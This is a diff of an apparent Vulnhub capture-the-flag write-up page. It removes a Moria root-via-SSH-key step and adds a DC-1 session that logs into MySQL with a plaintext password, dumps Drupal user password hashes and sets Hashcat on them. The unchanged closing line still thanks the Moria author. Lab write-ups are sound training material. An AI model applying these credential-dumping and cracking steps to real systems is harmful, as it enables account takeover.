@@ -224,33 +224,139 @@ www-data@DC-1:/var/www$
 					      'prefix' => '',
 </code></pre>
 			<br>
-			<p>Unfortunately, the poem didn't seem to offer any hints. This is where I spent the majority of my time with this CTF. Baesed on how this CTF had gone so far I was pretty sure it wouldn't involve any carzy exploits. g0tmi1k's guide to linux privilege escalation came in handy. I went through most of the guide until I reached his section on private keys. Earlier I had noticed there was a SSH key located in ~/.ssh/ and under closer inspection the loopback address of 127.0.0.1 was in the known_hosts list. Interesting. The id_rsa key didn't appear to be for Ori... after a few attempts I realized I could SSH as root without using a password! Here's the flag: </p>
+			<p>I took a look through the DrupalDB and found hashed passwords for the Admin and a user named Fred. I fired up Hashcat and decided to get it cracking while I took a look around the host.</p>
 			<br>
 <pre><code class="language-none">
--bash-4.2$ cat ~/.ssh/known_hosts
-127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=
+	www-data@DC-1:/var/www$ mysql -u dbuser -p
+	mysql -u dbuser -p
+	Enter password: R0ck3t
 
--bash-4.2$ ssh -i id_rsa root@127.0.0.1
-Last failed login: Tue May  9 01:19:10 EDT 2017 on pts/0
-There were 4 failed login attempts since the last successful login.
-Last login: Tue Mar 14 23:56:24 2017
-[root@Moria ~]# cat flag.txt
-“All that is gold does not glitter,
-Not all those who wander are lost;
-The old that is strong does not wither,
-Deep roots are not reached by the frost.
+	Welcome to the MySQL monitor.  Commands end with ; or \g.
+	Your MySQL connection id is 9976
+	Server version: 5.5.60-0+deb7u1 (Debian)
 
-From the ashes a fire shall be woken,
-A light from the shadows shall spring;
-Renewed shall be blade that was broken,
-The crownless again shall be king.”
+	Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
 
-All That is Gold Does Not Glitter by J. R. R. Tolkien
+	Oracle is a registered trademark of Oracle Corporation and/or its
+	affiliates. Other names may be trademarks of their respective
+	owners.
 
-I hope you suff.. enjoyed this VM. It wasn't so hard, was it?
--Abatchy
+	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
+	mysql> show databases;
+	show databases;
+	+--------------------+
+	| Database           |
+	+--------------------+
+	| information_schema |
+	| drupaldb           |
+	+--------------------+
+	2 rows in set (0.00 sec)
 
+	mysql> use drupaldb;
+	use drupaldb;
+	Reading table information for completion of table and column names
+	You can turn off this feature to get a quicker startup with -A
+
+	Database changed
+	mysql> show tables;
+	show tables;
+	+-----------------------------+
+	| Tables_in_drupaldb          |
+	+-----------------------------+
+	| actions                     |
+	| authmap                     |
+	| batch                       |
+	| block                       |
+	| block_custom                |
+	| block_node_type             |
+	| block_role                  |
+	| blocked_ips                 |
+	| cache                       |
+	| cache_block                 |
+	| cache_bootstrap             |
+	| cache_field                 |
+	| cache_filter                |
+	| cache_form                  |
+	| cache_image                 |
+	| cache_menu                  |
+	| cache_page                  |
+	| cache_path                  |
+	| cache_update                |
+	| cache_views                 |
+	| cache_views_data            |
+	| comment                     |
+	| ctools_css_cache            |
+	| ctools_object_cache         |
+	| date_format_locale          |
+	| date_format_type            |
+	| date_formats                |
+	| field_config                |
+	| field_config_instance       |
+	| field_data_body             |
+	| field_data_comment_body     |
+	| field_data_field_image      |
+	| field_data_field_tags       |
+	| field_revision_body         |
+	| field_revision_comment_body |
+	| field_revision_field_image  |
+	| field_revision_field_tags   |
+	| file_managed                |
+	| file_usage                  |
+	| filter                      |
+	| filter_format               |
+	| flood                       |
+	| history                     |
+	| image_effects               |
+	| image_styles                |
+	| menu_custom                 |
+	| menu_links                  |
+	| menu_router                 |
+	| node                        |
+	| node_access                 |
+	| node_comment_statistics     |
+	| node_revision               |
+	| node_type                   |
+	| queue                       |
+	| rdf_mapping                 |
+	| registry                    |
+	| registry_file               |
+	| role                        |
+	| role_permission             |
+	| search_dataset              |
+	| search_index                |
+	| search_node_links           |
+	| search_total                |
+	| semaphore                   |
+	| sequences                   |
+	| sessions                    |
+	| shortcut_set                |
+	| shortcut_set_users          |
+	| system                      |
+	| taxonomy_index              |
+	| taxonomy_term_data          |
+	| taxonomy_term_hierarchy     |
+	| taxonomy_vocabulary         |
+	| url_alias                   |
+	| users                       |
+	| users_roles                 |
+	| variable                    |
+	| views_display               |
+	| views_view                  |
+	| watchdog                    |
+	+-----------------------------+
+	80 rows in set (0.00 sec)
+
+	mysql> select * from users;
+	select * from users;
+	+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
+	| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |
+	+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
+	|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |
+	|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |
+	|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |
+	+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+
+	3 rows in set (0.01 sec)
 </code></pre>
 		<br>
 		<p>Thanks to @abatchy for a good challenge, and @g0tmi1k for hosting on Vulnhub! </p>
